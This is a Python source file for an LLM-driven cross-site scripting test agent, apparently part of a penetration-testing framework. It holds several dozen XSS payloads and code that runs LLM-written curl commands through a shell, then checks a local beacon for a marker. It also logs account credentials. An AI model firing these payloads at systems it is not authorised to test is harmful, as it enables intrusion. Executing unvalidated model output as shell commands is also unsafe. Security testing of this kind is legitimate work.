"""
XSS Agent - 完整版（使用LLM生成注入点）
"""

from typing import Dict, Any, List, Set
from pathlib import Path
import subprocess
import random
import string
import json
import re
from attack_agent.request_utils import append_credentials_to_curl, check_beacon_detection
import shlex
from config.llm_config import get_model_name, get_temperature
from attack_agent.request_utils import extract_useful_response
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode, quote

class XSSAgent:
    """
    XSS测试Agent（完整实现）

    工作流程：
    1. 调用LLM分析请求，识别XSS注入点
    2. LLM生成带{PAYLOAD}占位符的curl命令模板
    3. 生成统一的random_id（xss()函数会自动发送到beacon）
    4. 用实际XSS payload替换{PAYLOAD}占位符
    5. 执行测试：
       - GET URL注入：用driver.get()访问，立即检查beacon日志 + window.xss_array
       - 其他注入：用curl执行，记录token
    6. 检测逻辑：
       - 主要：检查beacon日志是否收到random_id（xss()函数会发送HTTP请求）
       - 补充：检查window.xss_array（xss()函数的fallback逻辑）
    7. finalize()阶段：遍历所有URL，收集window.xss_array（补充检测）
    """

    def __init__(self, client, driver,
                 xss_prompt_path: str = "prompt/xss_attack.txt",
                 log_dir: str = "output/attack_logs/xss",
                 reflection_enabled: bool = True):  # ✅ 新增：反思功能开关
        self.client = client
        self.driver = driver
        self.xss_prompt_path = Path(xss_prompt_path)
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self._log_path = self.log_dir / "xss_agent.log"
        self.reflection_enabled = reflection_enabled  # ✅ 保存配置

        # 存储执行记录：random_id -> {payload, url, method, ...}
        self.execution_records: Dict[int, Dict[str, Any]] = {}

        # 存储已触发的XSS random_id集合（从beacon检测）
        self.triggered_tokens: Set[str] = set()  # beacon检测用（字符串格式）
        self.xss_array: Set[int] = set()  # xss_array检测用（整数格式，补充）

    def _log(self, *args):
        msg = " ".join(str(a) for a in args)
        try:
            with open(self._log_path, "a", encoding="utf-8") as f:
                f.write(msg + "\n")
        except Exception:
            pass

    def _load_prompt_template(self) -> str:
        """加载XSS prompt模板"""
        return self.xss_prompt_path.read_text(encoding="utf-8")

    def test(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        测试单个请求的XSS（两阶段版本）

        两阶段测试流程：
        - Stage 1: 初始攻击（使用原始prompt）
        - Stage 2: 反思攻击（如果Stage 1失败，基于失败分析生成新策略）

        Args:
            request: 完整请求数据（包含response）
            credentials: 账户凭证

        Returns:
            {
                "vulnerable": True/False/None,
                "stage": 1 or 2,
                "payloads_tested": int,
                "random_id": int,
                "curl_templates": List[str]
            }
        """
        # ========== Stage 1: 初始攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 1: Initial Attack]")
        self._log(f"{'='*70}\n")

        result_stage1 = self._execute_stage1(request, credentials)

        # 如果检测到漏洞，直接返回
        if result_stage1.get("vulnerable") is True:
            self._log(f"\n[STAGE 1] ✓ VULNERABLE - Skipping Stage 2")
            return result_stage1

        # 如果未启用反思，直接返回Stage 1结果
        if not self.reflection_enabled:
            self._log(f"\n[Reflection] Disabled - Returning Stage 1 result")
            return result_stage1

        # ========== Stage 2: 反思攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 2: Reflective Attack]")
        self._log(f"{'='*70}")
        self._log(f"[Reflection] Stage 1 did not detect vulnerability, starting reflection analysis...")
        self._log(f"")

        result_stage2 = self._execute_stage2(
            request=request,
            credentials=credentials,
            stage1_context=result_stage1
        )

        return result_stage2

    def _sanitize_url_for_http(self, url: str) -> str:
        """
        把 URL 的 path/query 做安全编码，避免 < > 空格 引号 导致 curl/driver 解析失败
        """
        try:
            parts = urlsplit(url)
            # path 保留 / 和已有百分号编码
            path = quote(parts.path, safe="/%")
            # query 重新编码（value 会被 quote）
            qsl = parse_qsl(parts.query, keep_blank_values=True)
            query = urlencode(qsl, doseq=True, quote_via=quote)
            return urlunsplit((parts.scheme, parts.netloc, path, query, parts.fragment))
        except Exception:
            return url

    def _rewrite_curl_url(self, curl_command: str, new_url: str) -> str:
        """
        把 curl 命令里第一个 http(s)://... 参数替换成 new_url
        """
        try:
            parts = shlex.split(curl_command)
        except Exception:
            return curl_command

        for i, p in enumerate(parts):
            if p.startswith("http://") or p.startswith("https://"):
                parts[i] = new_url
                # 重新拼回字符串（你原来用 shell=True，所以返回字符串）
                return " ".join(shlex.quote(x) for x in parts)
        return curl_command


    def _execute_stage1(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 1初始攻击

        Returns:
            Stage 1结果字典（包含test_results和llm_analysis用于反思）
        """
        method = request.get("method", "GET")
        url = request.get("url", "")

        self._log(f"\n{'='*70}")
        self._log(f"[XSS] New Test Started")
        self._log(f"{'='*70}")
        self._log(f"[XSS] Testing: {method} {url}")
        self._log(f"\n[Received from Planning Agent]:")
        self._log(f"  Target Request:")
        self._log(f"    Method: {method}")
        self._log(f"    URL: {url}")
        self._log(f"    Headers: {json.dumps(request.get('headers', {}), indent=6)}")
        self._log(f"    Body: {request.get('body', 'None')}")
        self._log(f"    Response Status: {request.get('response_status', 'N/A')}")
        original_response = str(request.get('response_body', ''))
        extracted_response = extract_useful_response(original_response, max_length=2000)
        self._log(f"    Response Body (preview): {extracted_response}")
        self._log(f"  Credentials: {json.dumps(credentials, indent=6, default=str)}")
        self._log(f"")

        # ========== 第一步：调用LLM生成curl模板 ==========
        self._log(f"[Step 1: Calling LLM to Identify Injection Points]")
        curl_templates, llm_analysis = self._generate_curl_templates(request)  # ✅ 获取LLM分析输出

        if not curl_templates:
            self._log(f"[XSS] No injection points identified by LLM")
            return {
                "vulnerable": False,
                "stage": 1,  # ✅ 添加stage标记
                "payloads_tested": 0,
                "random_id": None,
                "curl_templates": [],
                "test_results": [],  # ✅ 添加test_results
                "llm_analysis": llm_analysis,  # ✅ 保存LLM分析
                "note": "No injection points found"
            }

        self._log(f"[LLM Generated {len(curl_templates)} curl template(s)]:")
        for i, tmpl in enumerate(curl_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log(f"")

        # ========== 第二步：生成random_id（作为beacon token）==========
        random_id = random.randint(100000, 999999)

        self._log(f"[Step 2: Generated Random ID (beacon token)]: {random_id}")
        self._log(f"  Expected beacon URL: http://127.0.0.1:9091/?data={random_id}")
        self._log(f"")

        # ========== 第三步：生成XSS payload列表 ==========
        xss_payloads = self._get_xss_payloads(random_id)
        self._log(f"[Step 3: Generated {len(xss_payloads)} XSS Payloads]:")
        for i, payload in enumerate(xss_payloads, 1):
            self._log(f"  {i}. {payload[:100]}{'...' if len(payload) > 100 else ''}")
        self._log(f"")

        # ========== 第四步：执行测试 ==========
        # self._log(f"[Step 4: Executing Tests]")
        # payloads_tested = 0

        # for template in curl_templates:
        #     self._log(f"\n[Testing Template]: {template}")

        #     # # 判断是否为GET URL注入
        #     # is_get_url = self._is_get_url_injection(template)

        #     for payload in xss_payloads:
        #         # 替换{PAYLOAD}为实际payload
        #         if not '{PAYLOAD}' in template:
        #             self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
        #             continue

        #         final_command = template.replace('{PAYLOAD}', payload)

        #         # 追加凭证
        #         final_command = append_credentials_to_curl(final_command, credentials)

        #         # 记录执行信息
        #         self.execution_records[random_id] = {
        #             "random_id": random_id,
        #             "payload": payload,
        #             "template": template,
        #             "command": final_command,
        #             "original_url": url,
        #             "method": method
        #         }

        #         if is_get_url:
        #             # ✅ GET URL注入：用driver.get()访问
        #             injected_url = self._extract_url_from_curl(final_command)
        #             self._log(f"  [Payload]: {payload}")
        #             self._log(f"  [Method]: driver.get()")
        #             self._log(f"  [URL]: {injected_url}")

        #             try:
        #                 self.driver.get(injected_url)

        #                 # ✅ 立即检查beacon日志（主要检测）
        #                 import time
        #                 time.sleep(0.5)  # 给beacon一点时间记录

        #                 if check_beacon_detection(str(random_id)):
        #                     self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id} detected in log!")
        #                     self.triggered_tokens.add(str(random_id))
        #                     # ✅ 检测到XSS，立即停止测试剩余payload
        #                     payloads_tested += 1
        #                     self._log(f"  🎯 XSS confirmed, stopping further tests for this request")
        #                     vulnerable = True
        #                     break  # ← 立即跳出循环

        #                 # ✅ 补充检查window.xss_array
        #                 try:
        #                     arr = self.driver.execute_script("return window.xss_array || [];")
        #                     self._log(f"  [Current XSS Array]: {arr}")

        #                     if arr:
        #                         for xss_id in arr:
        #                             self.xss_array.add(xss_id)
        #                             if xss_id == random_id:
        #                                 self._log(f"  ✓ XSS also detected in xss_array! Random ID {random_id}")
        #                                 # ✅ 检测到XSS，立即停止
        #                                 payloads_tested += 1
        #                                 self._log(f"  🎯 XSS confirmed via xss_array, stopping further tests")
        #                                 vulnerable = True
        #                                 break  # ← 跳出内层循环
        #                 except Exception as e:
        #                     self._log(f"  ⚠️  Failed to check xss_array: {e}")

        #                 # 如果已经检测到XSS（通过xss_array），跳出外层循环
        #                 if vulnerable:
        #                     break

        #                 self._log(f"  ✓ Executed via driver")
        #                 payloads_tested += 1

        #             except Exception as e:
        #                 self._log(f"  ✗ Failed: {e}")

        #         else:
        #             # ✅ 其他注入：用curl执行
        #             self._log(f"  [Payload]: {payload}")
        #             self._log(f"  [Method]: curl subprocess")
        #             # 打印完整命令（不截断）
        #             self._log(f"  [Command]: {final_command}")

        #             try:
        #                 process = subprocess.Popen(
        #                     final_command,
        #                     shell=True,
        #                     stdout=subprocess.PIPE,
        #                     stderr=subprocess.PIPE,
        #                     text=True
        #                 )
        #                 stdout, stderr = process.communicate(timeout=10)

        #                 # 解析HTTP状态码
        #                 from attack_agent.request_utils import parse_http_status_from_response
        #                 http_status, response_body = parse_http_status_from_response(stdout)

        #                 self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
        #                 if http_status is not None:
        #                     self._log(f"  HTTP Status: {http_status}")
        #                 self._log(f"  Response length: {len(response_body)} bytes")
        #                 # 修改后：
        #                 extracted_body = extract_useful_response(response_body, max_length=2000)
        #                 self._log(f"  Response (extracted): {extracted_body}")
        #                 if stderr:
        #                     self._log(f"  Stderr: {stderr}")
        #                 payloads_tested += 1

        #             except subprocess.TimeoutExpired:
        #                 self._log(f"  ✗ Timeout after 10 seconds")
        #             except Exception as e:
        #                 self._log(f"  ✗ Failed: {e}")

        self._log(f"[Step 4: Executing Tests]")
        payloads_tested = 0
        vulnerable = False  # 一定要先初始化

        for template in curl_templates:
            self._log(f"\n[Testing Template]: {template}")

            for payload in xss_payloads:
                if '{PAYLOAD}' not in template:
                    self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
                    continue

                # 1) 替换 payload
                final_command = template.replace('{PAYLOAD}', payload)
                injected_url = self._extract_url_from_curl(final_command)
                safe_url = self._sanitize_url_for_http(injected_url)
                if safe_url != injected_url:
                    final_command = self._rewrite_curl_url(final_command, safe_url)

                # 2) 确保 curl 带 -i 输出响应头
                final_command = self._ensure_curl_include_headers(final_command)

                # 3) 拼上凭证
                final_command = append_credentials_to_curl(final_command, credentials)

                # 4) 记录执行信息（保持你原来的逻辑）
                self.execution_records[random_id] = {
                    "random_id": random_id,
                    "payload": payload,
                    "template": template,
                    "command": final_command,
                    "original_url": url,
                    "method": method
                }

                self._log(f"  [Payload]: {payload}")
                self._log(f"  [Method]: curl + driver-render-if-html")
                self._log(f"  [Command]: {final_command}")

                try:
                    process = subprocess.Popen(
                        final_command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate(timeout=10)

                    # 5) 解析HTTP响应（状态 + 头 + body）
                    http_status, headers, body = self._parse_curl_response(stdout)

                    self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")
                    self._log(f"  Body length: {len(body)} bytes")

                    # 日志里保留一段裁剪后的 body
                    extracted_body = extract_useful_response(body, max_length=2000)
                    self._log(f"  Response (extracted): {extracted_body}")
                    if stderr:
                        self._log(f"  Stderr: {stderr}")

                    # 6) 判断是否HTML
                    is_html = self._is_html_response(headers, body)
                    self._log(f"  Is HTML: {is_html}")

                    # 7) 如果是HTML，用driver渲染并检测XSS
                    if is_html and self.driver:
                        if self._render_and_check_xss(body, random_id):
                            self._log(f"  🎯 XSS confirmed, stopping further tests for this request")
                            vulnerable = True
                            payloads_tested += 1
                            break  # 跳出 payload 循环

                    payloads_tested += 1

                except subprocess.TimeoutExpired:
                    self._log(f"  ✗ Timeout after 10 seconds")
                except Exception as e:
                    self._log(f"  ✗ Failed: {e}")

            # 如果已经确认存在XSS，跳出 template 循环
            if vulnerable:
                break

        # ========== 第五步：检查beacon日志（主要检测）==========
        # self._log(f"\n[Step 5: Checking Beacon Detection]")
        # # vulnerable = check_beacon_detection(str(random_id))

        # if vulnerable:
        #     self._log(f"  ✓✓✓ BEACON DETECTION: Random ID {random_id} found in log!")
        #     self.triggered_tokens.add(str(random_id))
        # else:
        #     self._log(f"  ✗ Beacon not detected (random_id {random_id} not in log)")

        # ========== 第五步：检查beacon日志（主要检测）==========
        self._log(f"\n[Step 5: Checking Beacon Detection]")
        if not vulnerable:
            vulnerable = check_beacon_detection(str(random_id))
        else:
            # 已经在渲染阶段确认过，就再记一条日志即可
            if check_beacon_detection(str(random_id)):
                self._log(f"  (Beacon also confirms XSS for Random ID {random_id})")

        # ========== 第六步：补充检查xss_array ==========
        if not vulnerable and random_id in self.xss_array:
            self._log(f"  ✓ XSS_ARRAY DETECTION: Random ID {random_id} found!")
            vulnerable = True

        self._log(f"\n{'='*70}")
        self._log(f"[XSS Test Summary]")
        self._log(f"  Total Payloads Tested: {payloads_tested}")
        self._log(f"  Random ID (beacon token): {random_id}")
        self._log(f"  Beacon Triggered: {str(random_id) in self.triggered_tokens}")
        self._log(f"  XSS Array Count: {len(self.xss_array)}")

        # # ✅ 判断结果
        # if vulnerable:
        #     self._log(f"  Result: VULNERABLE (XSS confirmed)")
        # else:
        #     # 检查是否有GET测试
        #     has_get_test = any(self._is_get_url_injection(tmpl) for tmpl in curl_templates)
        #     if has_get_test:
        #         # GET测试已完成，确定不存在漏洞
        #         self._log(f"  Result: SAFE (GET requests tested, no XSS triggered)")
        #     else:
        #         # 只有POST测试，等待finalize
        #         vulnerable = None
        #         self._log(f"  Result: PENDING (waiting for finalize to check stored XSS)")

        if vulnerable:
            self._log(f"  Result: VULNERABLE (XSS confirmed)")
        else:
            self._log(f"  Result: SAFE (no XSS triggered in immediate tests)")


        self._log(f"{'='*70}\n")

        return {
            "vulnerable": vulnerable,
            "stage": 1,  # ✅ 标记为Stage 1
            "payloads_tested": payloads_tested,
            "random_id": random_id,  # random_id既是beacon token也是xss_array ID
            "curl_templates": curl_templates,  # ✅ 保存用于反思
            "llm_analysis": llm_analysis,  # ✅ 保存LLM分析输出
            "note": f"Stage 1 - Immediate detection: {'XSS confirmed' if vulnerable else 'Pending finalize'}"
        }

    def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
        """
        调用LLM生成带{PAYLOAD}占位符的curl模板

        Returns:
            (curl模板列表, LLM完整输出) 元组
        """
        sys_prompt = self._load_prompt_template()
        original_response = str(request.get('response_body', ''))
        extracted_response = extract_useful_response(original_response, max_length=2000)

        # 格式化请求信息
        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for XSS testing."""

        self._log(f"\n[LLM INPUT - XSS Analysis Prompt]:")
        self._log(f"{'~'*70}")
        self._log(f"{user_prompt}")
        self._log(f"{'~'*70}\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                temperature=get_temperature("attack_agent")
            )

            llm_output = completion.choices[0].message.content

            self._log(f"[LLM OUTPUT - XSS Analysis Response]:")
            self._log(f"{'~'*70}")
            self._log(f"{llm_output}")
            self._log(f"{'~'*70}\n")

            # 解析Commands部分
            templates = self._parse_curl_templates(llm_output)

            return templates, llm_output  # ✅ 返回元组

        except Exception as e:
            self._log(f"[XSS] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""  # ✅ 错误时返回空列表和空字符串

    def _parse_curl_templates(self, llm_output: str) -> List[str]:
        """
        从LLM输出中提取curl模板（改进版，兼容多种LLM输出格式）

        Returns:
            curl模板列表
        """
        templates = []
        lines = llm_output.splitlines()

        # 查找 "Commands" 关键词所在行的索引
        commands_line_idx = -1
        for i, line in enumerate(lines):
            # 简单判断：行中是否包含 "command:" (不区分大小写)
            line_lower = line.lower()
            if 'command:' in line_lower or 'commands:' in line_lower:
                commands_line_idx = i
                break

        if commands_line_idx == -1:
            self._log(f"[Warning] No Commands section found in LLM output")
            return []

        # 从Commands行之后开始解析
        for i in range(commands_line_idx + 1, len(lines)):
            line = lines[i].strip()

            # 跳过空行
            if not line:
                continue

            # 跳过markdown代码块标记
            if line.startswith('```'):
                continue

            # 检查是否包含 curl 关键词和 {PAYLOAD} 占位符
            if 'curl' in line and '{PAYLOAD}' in line:
                # 清理可能的markdown格式
                cleaned = line.lstrip('`').rstrip('`').strip()
                templates.append(cleaned)

        if not templates:
            self._log(f"[Warning] No valid curl commands found after Commands section")

        return templates

    # def _get_xss_payloads(self, random_id: int) -> List[str]:
    #     """
    #     生成XSS payload列表（增强版 - 覆盖更多注入上下文 + 编码变形）

    #     Args:
    #         random_id: 随机ID（xss()函数会自动发送到beacon + 存入xss_array）

    #     Returns:
    #         payload列表，按上下文分类（包含原始payload和编码变形）
    #     """
    #     payloads = []

    #     # ========== 基础HTML上下文 ==========
    #     payloads.extend([
    #         f"<script>xss({random_id})</script>",
    #         f"\"'><script>xss({random_id})</script>",
    #         # 大小写混淆
    #         f"<ScRiPt>xss({random_id})</sCrIpT>",
    #         f"<SCRIPT>xss({random_id})</SCRIPT>",
    #         # HTML实体编码（标签名）
    #         f"&#60;script&#62;xss({random_id})&#60;/script&#62;",
    #         f"&#x3c;script&#x3e;xss({random_id})&#x3c;/script&#x3e;",
    #     ])

    #     # ========== 事件处理器（自动触发）==========
    #     payloads.extend([
    #         # 原始payload
    #         f'<img src="x" onerror="xss({random_id})">',
    #         f'<svg onload="xss({random_id})">',
    #         f'<body onload="xss({random_id})">',
    #         f'<iframe onload="xss({random_id})"></iframe>',
    #         f'<video onloadstart="xss({random_id})"><source></video>',
    #         f'<audio onloadstart="xss({random_id})"><source></audio>',

    #         # 大小写混淆
    #         f'<IMG SRC="x" ONERROR="xss({random_id})">',
    #         f'<ImG sRc="x" OnErRoR="xss({random_id})">',
    #         f'<SVG ONLOAD="xss({random_id})">',
    #         f'<SvG oNlOaD="xss({random_id})">',

    #         # HTML实体编码（事件名）
    #         f'<img src="x" &#111;&#110;&#101;&#114;&#114;&#111;&#114;="xss({random_id})">',
    #         f'<svg &#111;&#110;&#108;&#111;&#97;&#100;="xss({random_id})">',

    #         # 十六进制HTML实体
    #         f'<img src="x" &#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;="xss({random_id})">',

    #         # URL编码（用于src属性）
    #         f'<img src="x" onerror="xss%28{random_id}%29">',
    #     ])

    #     # ========== 事件处理器（用户交互）==========
    #     payloads.extend([
    #         f'<input onfocus="xss({random_id})" autofocus>',
    #         f'<select onfocus="xss({random_id})" autofocus><option>x</option></select>',
    #         f'<textarea onfocus="xss({random_id})" autofocus></textarea>',
    #         f'<marquee onstart="xss({random_id})">XSS</marquee>',
    #         f'<details open ontoggle="xss({random_id})">',

    #         # 大小写混淆
    #         f'<INPUT ONFOCUS="xss({random_id})" AUTOFOCUS>',
    #         f'<TEXTAREA OnFoCuS="xss({random_id})" autofocus></TEXTAREA>',
    #     ])

    #     # ========== JavaScript伪协议 ==========
    #     payloads.extend([
    #         # 原始payload
    #         f'<a href="javascript:xss({random_id})">click</a>',
    #         f'<iframe src="javascript:xss({random_id})"></iframe>',
    #         f'<form action="javascript:xss({random_id})"><input type="submit"></form>',
    #         f'<object data="javascript:xss({random_id})">',

    #         # URL编码
    #         f'<a href="javascript%3axss({random_id})">click</a>',
    #         f'<iframe src="javascript%3axss%28{random_id}%29"></iframe>',

    #         # 大小写混淆
    #         f'<a href="JaVaScRiPt:xss({random_id})">click</a>',
    #         f'<iframe src="JAVASCRIPT:xss({random_id})"></iframe>',

    #         # Tab/换行符绕过
    #         f'<a href="java\tscript:xss({random_id})">click</a>',
    #         f'<a href="java\nscript:xss({random_id})">click</a>',
    #         f'<a href="java\rscript:xss({random_id})">click</a>',

    #         # 十六进制编码
    #         f'<a href="javascript:xss&#x28;{random_id}&#x29;">click</a>',

    #         # Unicode编码（\u）
    #         f'<a href="javascript:\\u0078ss({random_id})">click</a>',
    #     ])

    #     # ========== 属性上下文（双引号）==========
    #     payloads.extend([
    #         f'x" onerror="xss({random_id})" z="',
    #         f'x" onload="xss({random_id})" z="',
    #         f'x" onfocus="xss({random_id})" autofocus z="',

    #         # HTML实体编码（事件名）
    #         f'x" &#111;&#110;&#101;&#114;&#114;&#111;&#114;="xss({random_id})" z="',

    #         # 大小写混淆
    #         f'x" OnErRoR="xss({random_id})" z="',
    #         f'x" ONERROR="xss({random_id})" z="',
    #     ])

    #     # ========== 属性上下文（单引号）==========
    #     payloads.extend([
    #         f"x' onerror='xss({random_id})' z='",
    #         f"x' onload='xss({random_id})' z='",

    #         # 大小写混淆
    #         f"x' OnErRoR='xss({random_id})' z='",
    #         f"x' ONLOAD='xss({random_id})' z='",
    #     ])

    #     # ========== 无引号属性上下文 ==========
    #     payloads.extend([
    #         f"x onclick=xss({random_id}) z=",
    #         f"x onload=xss({random_id}) z=",

    #         # 大小写混淆
    #         f"x OnClick=xss({random_id}) z=",
    #         f"x ONLOAD=xss({random_id}) z=",
    #     ])

    #     # ========== 标签闭合 ==========
    #     payloads.extend([
    #         f"</title><script>xss({random_id})</script>",
    #         f"</textarea><script>xss({random_id})</script>",
    #         f"</style><script>xss({random_id})</script>",
    #         f"</noscript><script>xss({random_id})</script>",
    #         f"</script><script>xss({random_id})</script>",

    #         # 大小写混淆
    #         f"</TITLE><ScRiPt>xss({random_id})</sCrIpT>",
    #         f"</TEXTAREA><SCRIPT>xss({random_id})</SCRIPT>",

    #         # HTML实体编码
    #         f"&#60;/title&#62;&#60;script&#62;xss({random_id})&#60;/script&#62;",
    #     ])

    #     # ========== HTML注释突破 ==========
    #     payloads.extend([
    #         f"--><script>xss({random_id})</script><!--",
    #         f"--!><script>xss({random_id})</script><!--",

    #         # 大小写混淆
    #         f"--><ScRiPt>xss({random_id})</sCrIpT><!--",
    #     ])

    #     # ========== JavaScript上下文（字符串内）==========
    #     payloads.extend([
    #         # 原始payload
    #         f"';xss({random_id});//",
    #         f"\";xss({random_id});//",
    #         f"`;xss({random_id});//",
    #         f"</script><script>xss({random_id})</script><script>",

    #         # Unicode转义（JavaScript字符串）
    #         f"';\\u0078ss({random_id});//",
    #         f"\";\\u0078ss({random_id});//",

    #         # 十六进制转义
    #         f"';\\x78ss({random_id});//",
    #         f"\";\\x78ss({random_id});//",

    #         # 八进制转义
    #         f"';\\170ss({random_id});//",

    #         # 换行符绕过
    #         f"';\nxss({random_id});//",
    #         f"';\rxss({random_id});//",

    #         # 注释符变形
    #         f"';xss({random_id});/*",
    #         f"';xss({random_id});<!--",
    #     ])

    #     # ========== JavaScript上下文（变量/对象）==========
    #     payloads.extend([
    #         f";xss({random_id})//",
    #         f",xss({random_id})//",
    #         f");xss({random_id});//",

    #         # 空格变形
    #         f"; xss({random_id})//",
    #         f",\txss({random_id})//",
    #         f");\nxss({random_id});//",
    #     ])

    #     # ========== CSS注入（style属性）==========
    #     payloads.extend([
    #         f'x;color:red;}}</style><script>xss({random_id})</script><style>',
    #         f"x:expression(xss({random_id}))",  # IE特有

    #         # 大小写混淆
    #         f'x;color:red;}}</STYLE><SCRIPT>xss({random_id})</SCRIPT><STYLE>',
    #         f"x:EXPRESSION(xss({random_id}))",

    #         # URL编码
    #         f'x;color:red;%7d</style><script>xss({random_id})</script><style>',
    #     ])

    #     # ========== 自闭合标签 ==========
    #     payloads.extend([
    #         f'<input onfocus="xss({random_id})" autofocus>',
    #         f'<embed src="javascript:xss({random_id})">',
    #         f'<use xlink:href="javascript:xss({random_id})"></use>',

    #         # 大小写混淆
    #         f'<INPUT OnFoCuS="xss({random_id})" AUTOFOCUS>',
    #         f'<EMBED SRC="javascript:xss({random_id})">',
    #     ])

    #     # ========== data: URL协议 ==========
    #     payloads.extend([
    #         # 原始payload
    #         f'<object data="data:text/html,<script>xss({random_id})</script>">',
    #         f'<iframe src="data:text/html,<script>xss({random_id})</script>">',

    #         # Base64编码
    #         f'<iframe src="data:text/html;base64,PHNjcmlwdD54c3Moe3JhbmRvbV9pZH0pPC9zY3JpcHQ+">',

    #         # URL编码
    #         f'<object data="data:text/html,%3Cscript%3Exss({random_id})%3C/script%3E">',

    #         # 大小写混淆
    #         f'<IFRAME SRC="data:text/html,<script>xss({random_id})</script>">',
    #     ])

    #     # ========== Meta标签 ==========
    #     payloads.extend([
    #         f'<meta http-equiv="refresh" content="0;url=javascript:xss({random_id})">',

    #         # 大小写混淆
    #         f'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:xss({random_id})">',

    #         # URL编码
    #         f'<meta http-equiv="refresh" content="0;url=javascript%3axss({random_id})">',
    #     ])

    #     # ========== CSS事件（动画/过渡）==========
    #     payloads.extend([
    #         f'<style>@keyframes x{{}}body{{animation-name:x}}</style><body onanimationstart="xss({random_id})">',
    #         f'<div style="transition:all 1s" ontransitionend="xss({random_id})">',
    #     ])

    #     # ========== 特殊字符绕过 ==========
    #     payloads.extend([
    #         # 斜杠
    #         f'<svg/onload="xss({random_id})">',
    #         f'<svg//onload="xss({random_id})">',

    #         # 制表符
    #         f'<img\tsrc=x\tonerror="xss({random_id})">',

    #         # 换行符
    #         f'<img\nsrc=x\nonerror="xss({random_id})">',
    #         f'<img\rsrc=x\ronerror="xss({random_id})">',

    #         # 多种空白符组合
    #         f'<svg\r\nonload="xss({random_id})">',
    #         f'<img\t\n\rsrc=x\t\n\ronerror="xss({random_id})">',

    #         # NULL字节（某些情况下有效）
    #         f'<img src="x" onerror="xss({random_id})">',
    #     ])

    #     return payloads

    def _get_xss_payloads(self, random_id: int) -> List[str]:
        """
        生成XSS payload列表（增强版 - 覆盖更多注入上下文 + 编码变形）

        Args:
            random_id: 随机ID（xss()函数会自动发送到beacon + 存入xss_array）

        Returns:
            payload列表，按上下文分类（包含原始payload和编码变形）
        """
        payloads = []

        # ========== 事件处理器（自动触发）==========
        payloads.extend([
            # 原始payload
            f'<img src="x" onerror="xss({random_id})">',
            f'<svg onload="xss({random_id})">',
            f'<body onload="xss({random_id})">',
            f'<iframe onload="xss({random_id})"></iframe>',
            f'<video onloadstart="xss({random_id})"><source></video>',
            f'<audio onloadstart="xss({random_id})"><source></audio>'
        ])

        # ========== JavaScript伪协议 ==========
        payloads.extend([
            # 原始payload
            f'<a href="javascript:xss({random_id})">click</a>',
            f'<iframe src="javascript:xss({random_id})"></iframe>',
            f'<form action="javascript:xss({random_id})"><input type="submit"></form>',
            f'<object data="javascript:xss({random_id})">',
        ])

        # ========== 属性上下文（双引号）==========
        payloads.extend([
            f'x" onerror="xss({random_id})" z="',
            f'x" onload="xss({random_id})" z="',
            f'x" onfocus="xss({random_id})" autofocus z="'
        ])

        # ========== 属性上下文（单引号）==========
        payloads.extend([
            f"x' onerror='xss({random_id})' z='",
            f"x' onload='xss({random_id})' z='"
        ])

        # ========== 无引号属性上下文 ==========
        payloads.extend([
            f"x onclick=xss({random_id}) z=",
            f"x onload=xss({random_id}) z=",
        ])

        # ========== 标签闭合 ==========
        payloads.extend([
            f"</title><script>xss({random_id})</script>",
            f"</textarea><script>xss({random_id})</script>",
            f"</style><script>xss({random_id})</script>",
            f"</noscript><script>xss({random_id})</script>",
            f"</script><script>xss({random_id})</script>",
        ])

        # ========== HTML注释突破 ==========
        payloads.extend([
            f"--><script>xss({random_id})</script><!--",
            f"--!><script>xss({random_id})</script><!--",
        ])

        # ========== JavaScript上下文（字符串内）==========
        payloads.extend([
            # 原始payload
            f"';xss({random_id});//",
            f"\";xss({random_id});//",
            f"`;xss({random_id});//",
            f"</script><script>xss({random_id})</script><script>"
        ])

        # ========== JavaScript上下文（变量/对象）==========
        payloads.extend([
            f";xss({random_id})//",
            f",xss({random_id})//",
            f");xss({random_id});//",
        ])

        # ========== CSS注入（style属性）==========
        payloads.extend([
            f'x;color:red;}}</style><script>xss({random_id})</script><style>',
            f"x:expression(xss({random_id}))",  # IE特有
        ])

        # ========== 自闭合标签 ==========
        payloads.extend([
            f'<input onfocus="xss({random_id})" autofocus>',
            f'<embed src="javascript:xss({random_id})">',
            f'<use xlink:href="javascript:xss({random_id})"></use>',
        ])

        # ========== 基础HTML上下文 ==========
        payloads.extend([
            f"<script>xss({random_id})</script>"
        ])

        return payloads

    # def _is_get_url_injection(self, curl_template: str) -> bool:
    #     """
    #     判断是否为GET请求且payload在URL参数中

    #     Args:
    #         curl_template: curl命令模板

    #     Returns:
    #         True表示GET URL注入
    #     """+
    #     # 检查是GET请求
    #     is_get = '-X GET' in curl_template or \
    #             ('{PAYLOAD}' in curl_template and '-X POST' not in curl_template and '-d' not in curl_template)

    #     # 检查payload在URL中（不在Header中）
